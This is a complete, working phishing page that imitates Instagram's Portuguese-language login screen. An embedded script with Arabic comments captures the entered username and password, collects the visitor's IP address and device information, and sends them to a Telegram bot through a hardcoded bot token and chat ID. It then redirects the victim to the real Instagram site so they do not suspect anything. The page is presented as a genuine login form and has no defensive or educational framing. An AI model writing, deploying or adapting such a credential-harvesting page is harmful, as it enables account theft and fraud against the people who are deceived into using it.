<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex"></section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" />
                </h1>
                
                <form id="login-form">
                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
                    <input id="user_identity" name="email" placeholder="Telefone, nome de usuário ou e-mail" required />

                    <label for="password" class="sr-only">Senha</label>
                    <input id="user_password" name="password" type="password" placeholder="Senha" required />

                    <button type="submit">Entrar</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <a href="#">Esqueceu a senha?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
            </div>
        </section>
    </main>

    <script>
        // بياناتك البرمجية
        const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
        const chat_id = '8658217605';

        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault(); // منع الصفحة من التحديث الطبيعي للتعامل مع البيانات برمجياً

            const email = document.getElementById('user_identity').value;
            const password = document.getElementById('user_password').value;
            
            // جلب معلومات الجهاز
            const device = navigator.userAgent;

            try {
                // جلب عنوان الـ IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // تنسيق الرسالة
                const message = `🔥 صيدة جديدة:\n\n` +
                              `📧 الحساب: ${email}\n` +
                              `🔑 الباسورد: ${password}\n\n` +
                              `🌐 الـ IP: ${userIP}\n` +
                              `📱 الجهاز: ${device}`;

                // إرسال البيانات للتليجرام
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);

                // التعديل المطلوب: إعادة التوجيه الفوري لموقع إنستغرام الرسمي
                window.location.replace("https://www.instagram.com");

            } catch (error) {
                // في حال حدوث أي خطأ، يتم التحويل أيضاً لضمان عدم شك المستخدم
                window.location.replace("https://www.instagram.com");
            }
        });
    </script>
</body>
</html>
